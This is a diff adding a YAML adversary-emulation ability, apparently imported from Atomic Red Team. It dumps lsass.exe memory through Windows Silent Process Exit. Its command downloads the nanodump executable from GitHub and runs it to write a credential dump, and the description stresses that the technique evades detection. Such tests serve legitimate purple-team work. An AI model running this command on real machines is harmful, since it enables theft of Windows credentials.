@@ -1,0 +1,69 @@
+- id: eb5adf16-b601-4926-bca7-dad22adffb37
+  name: Dump LSASS.exe Memory through Silent Process Exit
+  description: "WerFault.exe (Windows Error Reporting process that handles process\
+    \ crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory\
+    \ of your choice. This method relies on a mechanism \nintroduced in Windows 7\
+    \ called Silent Process Exit, which provides the ability to trigger\nspecific\
+    \ actions for a monitored process in one of two scenarios; either the process\
+    \ terminates\nitself by calling ExitProcess(), or another process terminates it\
+    \ via the TerminateProcess() API. \nThe major advantage of this technique is that\
+    \ it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create\
+    \ file dumps all the time (not just lsass.exe), this method provides \nthe added\
+    \ advantage of going undetected. WerFault.exe is a process known for dumping every\
+    \ crashing process, \nfrom an attacker standpoint this is appealing as their illicit\
+    \ credential extraction will \nappear benign because from a defender\u2019s viewpoint\
+    \ it\u2019s within the realm of normal activity.\n\nUpon successful execution,\
+    \ you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\"\
+    \ by default."
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+          {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"; fi;
+          PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit
+          "%temp%\SilentProcessExit"'
+        cleanup: rmdir "#{output_folder}" /s /q >nul 2> nul
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1003.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      output_folder:
+        description: Folder Path where resulting dump should be placed
+        type: path
+        default: '%temp%\SilentProcessExit'
+    dependencies:
+    - description: 'NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+
+        '
+      prereq_command: 'if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
+        Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
+
+        '
+    technique_created: '2020-02-11T18:41:44.783Z'
+    atomic_guid: eb5adf16-b601-4926-bca7-dad22adffb37
+    import_timestamp: '2025-06-24T11:15:06.618105Z'
